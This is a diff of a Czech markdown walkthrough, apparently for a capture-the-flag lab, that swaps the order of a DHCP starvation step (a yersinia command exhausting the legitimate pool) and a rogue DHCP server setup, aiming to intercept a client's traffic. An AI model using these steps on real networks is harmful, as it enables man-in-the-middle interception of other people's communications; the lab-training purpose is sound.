@@ -38,10 +38,21 @@ su student
 ```
  
 ---
+
+## Fáze 2 — DHCP Starvation
  
-## Fáze 2 — Rogue DHCP Server
+JSpustíme yersinia starvation. Cílem je vyčerpat zbývající adresy v poolu legitimního serveru, aby klient neměl na výběr a přijal adresu od nás:
  
-> **Důležité:** Rogue DHCP server musí být spuštěn *před* starvation útokem, aby byl okamžitě připraven obsloužit klienty, jakmile legitimní pool dojde.
+```bash
+yersinia dhcp -attack 1 -interface eth1
+```
+ 
+---
+ 
+ 
+## Fáze 3 — Rogue DHCP Server
+ 
+> **Důležité:** Rogue DHCP server musí být spuštěn rychle po starvation útoku, aby byl okamžitě připraven obsloužit klienty, jakmile legitimní pool dojde.
  
 ### Instalace
  
@@ -98,17 +109,7 @@ Ověření stavu:
 ```bash
 sudo systemctl status isc-dhcp-server
 ```
- 
----
- 
-## Fáze 3 — DHCP Starvation
- 
-Jakmile Rogue DHCP server běží, spustíme yersinia starvation. Cílem je vyčerpat zbývající adresy v poolu legitimního serveru, aby klient neměl na výběr a přijal adresu od nás:
- 
-```bash
-yersinia dhcp -attack 1 -interface eth1
-```
- 
+
 Průběžně kontrolujeme lease list, zda si klient vzal adresu od nás:
  
 ```bash
@@ -117,6 +118,7 @@ dhcp-lease-list
  
 Jakmile se v lease listu objeví alespoň jeden záznam, klient je náš a můžeme pokračovat dál.
  
+
 ---
  
 ## Fáze 4 — Zachycení komunikace (Flag 1)
